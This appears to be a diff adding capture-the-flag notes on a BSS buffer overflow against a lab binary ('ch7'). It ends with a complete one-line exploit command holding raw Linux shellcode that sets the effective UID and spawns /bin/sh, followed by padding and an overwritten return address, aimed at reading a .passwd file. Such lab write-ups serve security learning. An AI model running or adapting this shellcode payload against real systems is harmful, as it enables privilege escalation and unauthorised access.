@@ -1,0 +1,12 @@
+* BSS overflow is overflow of uninizialized section of data.
+* This exploit is interesting, we write linux shell code into the buffer,
+  then we will the whole buffer up with and characters, in this case 'A'.
+* Once we have enough characters to overflow and overwrite the EIP,
+  We then put in the memory address of the buffer that we wrote our shell code in.
+* The program will run the shell and then we can cat .passwd.
+
+*** NOTE: the right shell code needs to be used to set EUID
+
+COMMAND:
+
+./ch7 `python -c "print '\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + 'A'*473 + '\x40\xa0\x04\x08'"`
